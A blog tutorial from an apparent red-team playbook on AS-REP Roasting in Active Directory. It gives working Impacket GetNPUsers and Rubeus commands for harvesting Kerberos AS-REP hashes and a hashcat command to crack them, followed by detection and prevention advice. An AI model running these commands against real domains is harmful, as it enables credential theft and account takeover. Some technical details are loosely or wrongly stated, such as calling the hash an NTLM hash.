---
title: 'AS-REP Roasting'
date: 2025-09-23
permalink: /posts/asreproasting/
tags:
  - red team playbook
---

AS-REP Roasting is targeting misconfigured users in Windows AD.

| Tactic (MITRE ATT&CK) | Technique (MITRE ATT&CK)    | Objective                                                    | Permissions Required                        | Common Tools              |
| --------------------- | --------------------------- | ------------------------------------------------------------ | ------------------------------------------- | ------------------------- |
| Credential Access     | T1558.004 - AS-REP Roasting | Getting disabled kerberos authentication account pasword hash | Unauthenticated. Only need to connect to DC | Rubeus, Impacket, Hashcat |

---

# 1. Principle
AS-REP Roasting is targeting misconfigured users in Windows AD.

- **Pre-authentication:** Normally, when a user login, the user will send a AS-ESQ request to server. To prevent fake user request, KDC will request users to provide a "pre-authentication". It is a user's password hash with timestamps. When KDC received it, KDC will use the saved password hash to decrypt. If it is successful, it means the user has the correct password.

- **Vulnerability:** In AD, it is allowed to set a property about "DONT_REQ_PREAUTH" (UAC - 4194304) for a user. When the property is enabled, KDC will bypass the above authentication steps.
- **Attack Process:** 
  - **Discovery:** Attacker just need a valid username list (It could be brute force/OSINT/other ways to get it)
  - **Request:** Attacker could send a AS-REQ request to KDC for every users in the list which is not containing pre-authentication information.
  - **Gain:** If a user set `DONT_REQ_PREAUTH`, KDC will pass a `AS-REP`message which contained user's NTLM password hash which is encrypted. This is part of the TGT (Ticket Granting Ticket).
  - **Crack:** After getting AS-REP, they can export it and use hashcat to brute force.

Attacker just need the username and KDC's IP address.

# 2. Attack Steps & Commands

### Method 1: Using Impacket (in Linux/MacOS attack machine)
**Step 1: Prepare username list**
```
# user_list.txt
administrator
admin
guest
testuser
svc_sql
```

**Step 2: Perform attack**
- `GetNPUsers.py` is for this attack
```
# -dc-ip: DC IP
# -usersfile: Username File
# -format hashcat: save as the format, hashcat can crack it
# corp.local/: provide a domain name only

python3 GetNPUsers.py -dc-ip 192.168.1.10 -usersfile user_list.txt -format hashcat -outputfile hashes.txt corp.local/
```
If it is successful, the `hashes.txt`contains `$krb5asrep$23$svc_nopreauth@CORP.LOCAL: ...[hash]...`will show the valid AS-REP users.

**Step 3: Cracking**
- Brute force the `hashes.txt` with Hashcat
```
hashcat -m 18200 -a 0 hashes.txt /path/to/wordlist.txt
#  `-m 18200` is the format of Kerberos 5 AS-REP etype 23
```

### Method 2: Using Rubeus (on Windows machine)
- If the attacker has already get the shell, they can use this:
```
# /nopreauth: targeted user type
# /domain: targeted domain
# /dc: targeted domain controller
# /format:hashcat:

.\Rubeus.exe asreproast /nopreauth /domain:corp.local /dc:dc01.corp.local /format:hashcat /outfile:hashes.txt
```

## 3. Defense & Mitigation
### Detection
1.  **Monitoring ID 4768:**
    *   event ID should be: `A Kerberos authentication ticket (TGT) was requested`. Finding the `successful`message related to ID 4768 but the `Pre-Authentication Type` value should be `0`. 
2.  **Packet Analysis:**
    *   Some open source tools such as Zeek/Suricata. These ype of NIDS can monitor Kerberos traffic (Port 88). Find some string related to `padata` (Pre-Authentication Data).

### Prevention
1. **Enable kerberos pre-authentication:**
   *   Find the users in AD which set `DONT_REQ_PREAUTH`.Fix it in "Active Directory Users and Computers" --> Choose  "Do not require Kerberos preauthentication"

   ```
   Get-ADUser -Filter {UserAccountControl -band 4194304} -Properties SamAccountName,UserAccountControl
   ```
2. **Remove non active users**
3. **Complex Password**